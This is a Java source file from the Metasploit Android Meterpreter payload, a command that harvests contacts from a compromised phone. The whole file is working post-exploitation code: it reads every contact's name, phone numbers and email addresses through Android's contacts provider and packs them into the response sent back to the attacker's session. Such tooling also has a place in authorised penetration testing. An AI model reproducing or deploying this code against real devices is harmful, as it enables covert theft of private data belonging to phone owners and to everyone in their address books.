package com.metasploit.meterpreter.android;

import android.content.ContentResolver;
import android.database.Cursor;
import android.os.Build;
import android.provider.ContactsContract;

import com.metasploit.meterpreter.AndroidMeterpreter;
import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.command.Command;

public class dump_contacts_android implements Command {

	private static final int TLV_EXTENSIONS = 20000;
	private static final int TLV_TYPE_CONTACT_GROUP = TLVPacket.TLV_META_TYPE_GROUP | (TLV_EXTENSIONS + 9007);
	private static final int TLV_TYPE_CONTACT_NUMBER = TLVPacket.TLV_META_TYPE_STRING | (TLV_EXTENSIONS + 9008);
	private static final int TLV_TYPE_CONTACT_EMAIL = TLVPacket.TLV_META_TYPE_STRING | (TLV_EXTENSIONS + 9009);
	private static final int TLV_TYPE_CONTACT_NAME = TLVPacket.TLV_META_TYPE_STRING | (TLV_EXTENSIONS + 9010);
	
	@Override
	public int execute(Meterpreter meterpreter, TLVPacket request,
			TLVPacket response) throws Exception {

		ContentResolver cr = AndroidMeterpreter.getContext().getContentResolver();
		
		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.ECLAIR) {
			
			Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
			
			if (cur.getCount() > 0) {
				
				while (cur.moveToNext()) {
					
					TLVPacket pckt = new TLVPacket();
					
					String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
					
			        //String displayName = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME_PRIMARY));
	                pckt.addOverflow(TLV_TYPE_CONTACT_NAME, 
	                		cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME_PRIMARY)));
			        
		            Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
		                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[] { id }, null);
		            
		            while (pCur.moveToNext()) {
		                //String number = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
		                //String typeStr = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE));
		                
		                pckt.addOverflow(TLV_TYPE_CONTACT_NUMBER,
		                		pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
		            }            
		            pCur.close();
	
		            Cursor emailCur = cr.query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, null,
		            		ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?", new String[] { id }, null);
		            
	            	while (emailCur.moveToNext()) {
	            		//String email = emailCur.getString(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
	            		//String emailType = emailCur.getString(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.TYPE));
	            		
		                pckt.addOverflow(TLV_TYPE_CONTACT_EMAIL, 
		                		emailCur.getString(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA)));	            		
	            	}	            	
	            	emailCur.close();
	            	
	            	response.addOverflow(TLV_TYPE_CONTACT_GROUP, pckt);
	
				}
			}
			
			cur.close();
		}

		return ERROR_SUCCESS;
	}

}
